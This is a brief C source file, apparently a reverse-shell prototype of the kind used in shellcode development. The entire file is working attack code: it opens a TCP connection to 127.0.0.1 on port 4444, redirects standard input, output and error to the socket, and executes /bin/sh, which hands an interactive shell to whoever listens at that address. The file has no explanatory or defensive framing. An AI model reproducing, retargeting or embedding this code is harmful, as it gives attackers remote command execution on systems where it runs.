#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main()
{
    struct sockaddr_in sa;

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}
